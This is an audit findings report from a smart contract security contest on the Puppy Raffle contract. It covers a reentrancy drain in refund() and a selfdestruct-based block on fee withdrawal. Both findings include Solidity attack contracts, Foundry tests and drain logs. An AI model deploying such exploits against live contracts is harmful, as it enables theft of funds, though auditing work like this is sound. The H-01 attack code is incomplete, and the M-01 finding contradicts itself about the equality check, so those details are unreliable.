# First Flight #2: Puppy Raffle - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Sending native ETH value before updating state in leads to reentrancy](#H-01)
- ## Medium Risk Findings
    - ### [M-01. Strict equality of puppyRaffe contract balance and and total fees check makes `fee` withdrawal impossible. ](#M-01)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #2

### Dates: Oct 25th, 2023 - Nov 1st, 2023

[See more contest details here](https://www.codehawks.com/contests/clo383y5c000jjx087qrkbrj8)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 1
   - Medium: 1
   - Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. Sending native ETH value before updating state in leads to reentrancy            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L96C4-L96C7

## Summary
In `PuppyRaffle::refund`, native ETH is sent to the player using using the `sendValue` function from the `Address` lib from openZeppelin. The problem here lies in the fact that it sends the native ETH value using the low-level `call` so all gas is forwarded to receiver before the state is updated. 

## Vulnerability Details
A malicious player can enter the reffle using a contract rather than an EOA and decide to get out using the `refund` function but since it is a contract, it can run arbitrary code in either the `receive` or `fallback` functions in the receiving contract when the native ETH is sent and it provides an opportunity for reentrancy which can lead to the contract getting drained of all the funds. 

<details>
<summary>Poc</summary>

#### Attack contract
```solidity
IPuppyRaffle puppyRaffle;
    address  public  owner;

    constructor(address _puppyRaffle) {
        puppyRaffle = IPuppyRaffle(_puppyRaffle);
        owner = payable(msg.sender);
    }

    receive() external payable {
        if (address(puppyRaffle).balance >= 1) {
            attackRefund(4);
        } else {
             if (msg.sender != owner) {
            revert();
        }

        (bool success,) = owner.call{value: address(this).balance}("");
        if (!success) revert();
        }
    }
}
```

#### Add the test below to `PuppyRaffleTest.t.sol`
```solidity
///@notice Don't forget to import the attackPuppyRaffle contract 
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );

        vm.startPrank(attacker);
        attackPuppyRaffle = new AttackPuppyRaffle(address(puppyRaffle));
        vm.stopPrank();
     
    }

        function testCanReenter() external playersEntered {
        console.log("PuppyRaffle balance before: ", address(puppyRaffle).balance);
        address attackerPlayer = address(attackPuppyRaffle);
        vm.deal(attackerPlayer, 1 ether);
        address[] memory players = new address[](1);
        players[0] = attackerPlayer;
        console.log("attacker EOA balance before", attackPuppyRaffle.owner().balance);


        vm.startPrank(attackerPlayer);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackPuppyRaffle.attackRefund(4);
        vm.stopPrank();

        console.log("PuppyRaffle balance after: ", address(puppyRaffle).balance);
        console.log("attackPuppy balance after: ", address(attackPuppyRaffle).balance);
        console.log("attacker EOA balance after", attackPuppyRaffle.owner().balance);
    }
```

#### logs: 
```
Running 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] testCanReenter() (gas: 246064)
Logs:
  PuppyRaffle balance before:  4000000000000000000
  attacker EOA balance before 0
  PuppyRaffle balance after:  0
  attackPuppy balance after:  0
  attacker EOA balance after 5000000000000000000
```

</details>
## Impact
100% of the protocol balance can be drained from the contract by a malicious player during an active raffle. 

## Tools Used
Manual review & Foundry. 

## Recommendations
1. Checks-Effects-Interactions pattern as recommended by the official solidity docs [here](https://docs.soliditylang.org/en/v0.8.22/security-considerations.html#use-the-checks-effects-interactions-pattern) should be followed. 
2. Use the ReentrancyGuard Library from OpenZeppelin. 
		
# Medium Risk Findings

## <a id='M-01'></a>M-01. Strict equality of puppyRaffe contract balance and and total fees check makes `fee` withdrawal impossible.             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L158

# Strict equality of puppyRaffe contract balance and and total fees check makes `fee` withdrawal impossible. 

## Summary
The `withdrawFees()` function sends the fees that has been earned throughout the duration of an active raffle to the `feeAddress` designated upon deployment of the `PuppyRaffle` contract. The problem lies in the fact that it checks if the contract balance matches the the amount of fees collected.




## Vulnerability Details
        
Fee withdrawal from the protocol is dependent on the balance of the contract being strictly equal to the total fees collected as denoted here in `withdrawFees()` below: 
```
 function withdrawFees() external {
        require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Proof of Concept
To demonstrate we use a sample smart contract that forcibly sends ETH to the contract using `selfdestruct` which is currently deprecated in solidity but can still be used in this instance. 


<details>
<summary>Poc</summary>

Attack contract: 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract AttackPuppyRaffle {
    receive() external payable {}

    function attack(address puppy) external payable {
        selfdestruct(payable(puppy));
    }
}
```


Poc test:
```
function testCannotWithdrawFees() public playersEntered {
        // simulate Sets block.timestamp past the raffle duration.
        vm.warp(block.timestamp + duration + 1);

        // setup attacker.
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
        vm.prank(attacker);

        // fund the attack contract
        (bool success,) = address(attackPuppyRaffle).call{value: 1 wei}("");
        if (!success) revert();

        // select a winner via pseudorandomness. 
        puppyRaffle.selectWinner();

        // Now let's forcibly send ETH to puppyRaffle contract
        attackPuppyRaffle.attack(address(puppyRaffle));
        
        
        vm.expectRevert();
        // Fees cannot be withdrawn. 
        puppyRaffle.withdrawFees();
        console.log(puppyRaffle.feeAddress().balance);
    }
```
</details>


## Impact
Any call to withdraw the protocol fees will be reverted, as a result fees can never be withdrawn from the protocol. 

## Tools Used
Manual review and foundry. 

## Recommendations
The usage of strict equality for that check is not recommended in this instance. 

1. A more flexible check like this would suffice. </br>
`require(address(this).balance >= uint256(totalFees), "PuppyRaffle: There are currently players active!");`

2. Any amount that is left in the contract balance after the winner has been selected and paid should be withdrawn. 

This would allow fees to be withdrawn even though the contract balance is forcibly inflated. 




